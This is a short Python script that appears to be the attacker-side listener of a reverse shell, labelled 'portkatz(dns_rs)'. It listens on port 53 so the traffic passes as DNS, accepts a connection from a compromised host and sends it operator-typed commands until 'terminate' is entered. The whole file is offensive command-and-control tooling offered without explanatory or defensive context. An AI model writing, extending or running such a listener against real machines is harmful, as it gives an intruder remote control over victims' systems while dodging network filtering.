
import socket

address = ('1.1.1.1', 53)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def connect():
    s.bind(address)
    s.listen(1)
    print('[+] Listener Active on Port 53 (DNS)')
    conn, addr = s.accept()
    print('[+] Connection from: ', addr)
    while True:
        command = input('portkatz(dns_rs) > ')
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            quit()
        else:
            conn.send(command.encode())

if __name__ == '__main__':
    connect()
            